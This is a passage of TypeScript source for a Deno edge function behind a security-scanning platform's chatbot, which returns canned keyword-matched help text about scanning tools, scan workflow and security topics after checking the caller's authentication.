2. Select a scanning tool (Nmap, Nuclei, ZAP, Nikto, YARA, etc.)
3. Enter your target URL, IP address, or file path
4. Configure any scan options (or leave defaults)
5. Review and click **Launch Scan**

**How it works:**
- The scan request is sent to the Orion backend
- Your Termux agent picks up the task and runs the real tool on your device
- Results are sent back and displayed in the **Vulnerabilities** page

**Available tools:**
- **Nmap** — port scanning and service detection
- **Nuclei** — vulnerability scanning with templates
- **Nikto** — web server misconfiguration scanning
- **WhatWeb** — technology fingerprinting
- **ZAP** — web application scanning
- **YARA** — malware pattern matching
- **DNS** — DNS record enumeration
- **SSLyze** — TLS/SSL analysis
- **Trivy** — dependency vulnerability scanning
- **Semgrep** — static code analysis
- **Gitleaks** — secret/credential detection

You can also test commands interactively in the **Lab** page.`;
  }
  return '';
}

function getToolListResponse(msg: string): string {
  const lower = msg.toLowerCase();
  if ((lower.includes('what') && lower.includes('tool')) || lower.includes('available tools') || lower.includes('list of tools') || lower.includes('which tools')) {
    return `**Available Scanning Tools in Orion:**

| Tool | Purpose | Platform |
|------|---------|----------|
| **Nmap** | Port scanning & service detection | Termux/Kali |
| **Masscan** | Fast port scanning | Termux/Kali |
| **Nuclei** | Vulnerability scanning (templates) | Termux/Kali |
| **Nikto** | Web server misconfigurations | Termux/Kali |
| **WhatWeb** | Technology fingerprinting | Termux/Kali |
| **ZAP** | Web application scanner | Termux/Kali |
| **YARA** | Malware pattern matching | Termux/Kali |
| **DNS** | DNS record enumeration | Cloud/Termux |
| **SSLyze** | TLS/SSL analysis | Termux/Kali |
| **Trivy** | Dependency scanning | Termux/Kali |
| **Semgrep** | Static code analysis | Termux/Kali |
| **Gitleaks** | Secret/credential detection | Termux/Kali |
| **httpx** | HTTP probing | Termux/Kali |

**Server-side scans** (run from the cloud, no agent needed):
- Nuclei, Nikto, WhatWeb, DNS, SSLyze, ZAP, Trivy, Semgrep, Gitleaks

**Agent scans** (run on your Termux device for real results):
- All of the above + YARA

Select any tool from the New Scan page to get started!`;
  }
  return '';
}

function getGenericResponse(msg: string): string {
  const lower = msg.toLowerCase();

  // Check for "what is X" or "explain X" or "tell me about X"
  if (lower.startsWith('what is') || lower.startsWith('explain') || lower.startsWith('tell me about') || lower.startsWith('describe') || lower.startsWith('how does') || lower.startsWith('how do') || lower.startsWith('how to') || lower.startsWith('what are') || lower.includes('help with') || lower.includes('help me')) {
    return `I can help with that! Here are the cybersecurity topics I'm knowledgeable about:

**Vulnerabilities:**
- SQL Injection, XSS, CSRF, SSRF, RCE
- OWASP Top 10 security risks
- Privilege escalation
- Command injection

**Security Tools:**
- Nmap (port scanning), Nuclei (vuln scanning)
- Nikto (web server scanning), ZAP (web app scanning)
- YARA (malware detection), WhatWeb (tech fingerprinting)
- SSLyze (TLS analysis), Trivy (dependency scanning)
- Semgrep (code analysis), Gitleaks (secret detection)
- Wireshark/tcpdump (traffic analysis)
- Hashcat/John (password cracking)

**Security Practices:**
- Authentication & password security
- TLS/SSL configuration
- Web server hardening
- Cryptography fundamentals
- Network security
- Penetration testing methodology
- OSINT techniques
- Malware analysis
- Reverse engineering

Try asking me about any specific topic, for example:
- "Explain SQL injection"
- "How does Nmap work?"
- "What is YARA?"
- "How to prevent XSS?"
- "Explain the OWASP Top 10"`;
  }

  return `I'm the Orion AI Security Assistant. I can help you with cybersecurity topics including:

- **Vulnerabilities:** SQL Injection, XSS, CSRF, SSRF, RCE, OWASP Top 10
- **Security Tools:** Nmap, Nuclei, Nikto, ZAP, YARA, WhatWeb, SSLyze
- **Best Practices:** Authentication, TLS/SSL, web server hardening, cryptography
- **Methodology:** Penetration testing, OSINT, malware analysis, reverse engineering

Ask me about any security topic! For example:
- "What is SQL injection?"
- "How to prevent XSS attacks?"
- "Explain the OWASP Top 10"
- "How does YARA work?"
- "What are common web server misconfigurations?"`;
}

function generateResponse(message: string): string {
  const lowerMessage = message.toLowerCase();

  // Check knowledge base categories
  for (const category of CATEGORIES) {
    if (category.keywords.some((kw) => lowerMessage.includes(kw))) {
      return category.generate(message);
    }
  }

  // Check conversation patterns
  const greeting = getGreetingResponse(message);
  if (greeting) return greeting;

  const howTo = getHowToResponse(message);
  if (howTo) return howTo;

  const toolList = getToolListResponse(message);
  if (toolList) return toolList;

  // Generic helpful response
  return getGenericResponse(message);
}

// ============================================================
// EDGE FUNCTION HANDLER
// ============================================================

Deno.serve(async (req: Request) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 200, headers: corsHeaders });
  }

  try {
    // Verify the caller is authenticated
    const authHeader = req.headers.get('Authorization') ?? '';
    const token = authHeader.replace('Bearer ', '');
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
    );
    const { data: userData } = await supabase.auth.getUser(token);
    if (!userData.user?.id) {
      return new Response(
        JSON.stringify({ error: 'Unauthorized' }),
        { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const body = await req.json();
    const message = body.message ?? '';
    const history = body.history ?? [];

    if (!message || typeof message !== 'string') {
      return new Response(
        JSON.stringify({ error: 'Message is required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Generate intelligent response based on the message and conversation history
    const reply = generateResponse(message);

    // Use history for context-aware responses
    const lastMessages = history.slice(-3);
    const lastUserMsg = lastMessages.filter((m: { role: string }) => m.role === 'user').pop();

    // If user is asking a follow-up about the same topic, provide more detail
    if (lastUserMsg) {
      const currentLower = message.toLowerCase();

      // Check if asking for more detail
      if (currentLower.includes('more') || currentLower.includes('detail') || currentLower.includes('elaborate') || currentLower.includes('explain further')) {
        return new Response(
          JSON.stringify({
            reply: `${reply}\n\n---\n\n**Additional Resources:**\n- Practice in the Orion Lab with real tools\n- Run scans against authorized targets only\n- Check the Guide page for step-by-step tutorials\n- Use YARA rules for malware analysis on your device`,
          }),
          { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
      }
    }

    return new Response(
      JSON.stringify({ reply }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ error: err instanceof Error ? err.message : 'Unknown error' }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
